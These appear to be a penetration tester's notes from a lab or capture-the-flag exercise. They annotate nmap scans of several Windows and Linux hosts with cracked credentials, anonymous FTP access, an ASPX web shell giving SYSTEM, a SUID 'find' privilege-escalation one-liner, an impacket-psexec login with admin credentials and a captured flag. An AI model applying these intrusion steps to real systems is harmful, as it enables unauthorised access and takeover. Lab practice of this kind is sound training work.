192.168.100.55   WINSERVER-03   **TARGET**  SMB BRUTEFORCE ?
192.168.100.50   WINSERVER-01   TARGET WORDPRESS BRUTEFORCE ?
192.168.100.52   IP-192-168-100-  **X**
192.168.100.51   WINSERVER-02  **X**


Nmap scan report for ip-192-168-100-50.eu-central-1.compute.internal (192.168.100.50)
Host is up (0.00066s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc   -----> **SMB LOGIN (mike:diamond)**
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
MAC Address: 02:12:E1:99:EE:8B (Unknown)



Nmap scan report for ip-192-168-100-51.eu-central-1.compute.internal (192.168.100.51)
Host is up (0.00077s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd  ----> **ANONYMOUS**
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:1E:DD:A4:E0:4D (Unknown)

**http://192.168.100.51/cmdasp.aspx** **->>> NT/AUTHORITY SYSTEM**

Nmap scan report for ip-192-168-100-52.eu-central-1.compute.internal (192.168.100.52)
Host is up (0.0044s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp  -> **annonymous login** 
*Greetings gentlemen!*

- *I have setup the server successfully and have configured Drupal.*
- *Your Drupal usernames are exactly the same as your user account passwords on this server. Contact me to get your Drupal passwords.*
- *I was too busy to setup a file sharing server so i will be posting the updates here.*

- *admin*

22/tcp   open  ssh -----> **ACCOUNT (dbadmin:sayang)**
80/tcp   open  http ----> **ACCOUNT (dbadmin:sayang dbadmin@syntex.com)**
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
MAC Address: 02:A4:4B:19:5A:E9 (Unknown)

**dbadmin@ip-192-168-100-52:/home/auditor$ cat flag.txt**
**8a188d64fa234fe9b9671ba4bd6e11e4**

```
SUID BIT PRIV ESC./find . -exec /bin/sh -p \; -quit
```


Nmap scan report for ip-192-168-100-55.eu-central-1.compute.internal (192.168.100.55)
Host is up (0.00035s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds ----> **ACCOUNT (lawrence:computadora**) READ ONLY  ->>>> (**admin:blanca**) READ ONLY ->>> (**administrator:swordfish**) **ADMIN**
)

3389/tcp open  ms-wbt-server
MAC Address: 02:2A:CB:0B:8D:55 (Unknown)

**impacket-psexec administrator:swordfish@192.168.100.55**



Nmap scan report for ip-192-168-100-63.eu-central-1.compute.internal (192.168.100.63)
Host is up (0.00038s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
MAC Address: 02:22:FC:58:FC:37 (Unknown)



Nmap scan report for ip-192-168-100-67.eu-central-1.compute.internal (192.168.100.67)
Host is up (0.00045s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:CA:7F:B7:52:AF (Unknown)



Nmap scan report for ip-192-168-100-5.eu-central-1.compute.internal (192.168.100.5)
Host is up (0.0000040s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server
5910/tcp open  cm
